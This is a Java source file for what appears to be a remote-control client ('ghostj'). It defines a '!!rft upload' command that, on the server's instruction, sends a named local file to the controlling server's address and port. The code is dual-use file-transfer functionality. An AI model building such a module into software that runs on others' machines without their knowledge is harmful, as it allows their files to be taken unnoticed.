package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.conn.HandleConn;
import com.ghostj.client.core.ClientMain;
import com.rft.core.client.FileSender;

import java.io.File;
import java.util.Date;

public class FuncRFT implements AbstractFunc {
	@Override
	public String getFuncName() {
		return "!!rft";
	}

	@Override
	public String[] getParamsModel() {
		return new String[]{"<oper>","[params]"};
	}

	@Override
	public String getDescription() {
		return "调用rft功能";
	}

	@Override
	public int getMinParamsAmount() {
		return 1;
	}

	@Override
	public void run(String[] params, String cmd, AbstractProcessor processor) {
		switch (params[0]){
			case "upload":{
				if(params.length<3){
					HandleConn.writeToServerIgnoreException("命令语法不正确");
					break;
				}
				try {
					FileSender.sendFileMethod(new File(params[1].replaceAll("\\?"," ")),params[2],new Date().getTime()+"",HandleConn.ip,HandleConn.rft_port);
				} catch (Exception e) {
					e.printStackTrace();
					HandleConn.writeToServerIgnoreException("上传出错"+ ClientMain.getErrorInfo(e)+"\n");
				}
				break;
			}
			default:{
				HandleConn.writeToServerIgnoreException("命令语法不正确");
				break;
			}
		}
		HandleConn.sendFinishToServer();
	}
}
